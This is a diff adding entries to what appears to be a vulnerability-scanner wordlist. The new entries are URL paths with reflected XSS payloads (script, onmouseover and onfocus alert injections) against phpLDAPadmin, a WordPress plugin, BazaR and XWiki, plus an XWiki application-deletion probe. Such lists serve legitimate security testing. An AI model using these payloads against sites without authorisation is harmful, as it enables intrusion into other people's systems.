@@ -1001,3 +1001,11 @@ request?info=<svg onload=alert(
 /wp-content/plugins/qwiz-online-quizzes-and-flashcards/qwiz_admin_sample_buttons.php?theme_stylesheet=\
 /unsafe/plain/https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg
 /tileserver.php/wmts/x/1/1/asd?Request=x&layer=%3Csvg+alert(document.domain)%3E
+/phpldapadmin/
+/phpldapadmin/entry_chooser.php?container=%3Cscript%3Ealert(document.domain)%3C/script%3E
+/?cf-api=%22%20style=position:fixed;left:0;top:0;right:0;bottom:0;%20onmouseover=alert(1)%20x
+/reset-password/?selector=test
+/?post_type=tsml_meeting&tsml-query=%22%20onfocus%3Dalert%28document.domain%29%20autofocus%20%22
+/?BazaR&vue=formulaire&action=confirm_delete&idformulaire=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+/bin/view/AppWithinMinutes/DeleteApplication?appName=Help.Applications.Contributors&resolve=true&xredirect=%2fbin%2fview%2fHelp%2fApplications%2fContributors%2f
+/xwiki/bin/view/AppWithinMinutes/DeleteApplication?appName=Help.Applications.Contributors&resolve=true&xredirect=%2fbin%2fview%2fHelp%2fApplications%2fContributors%2f
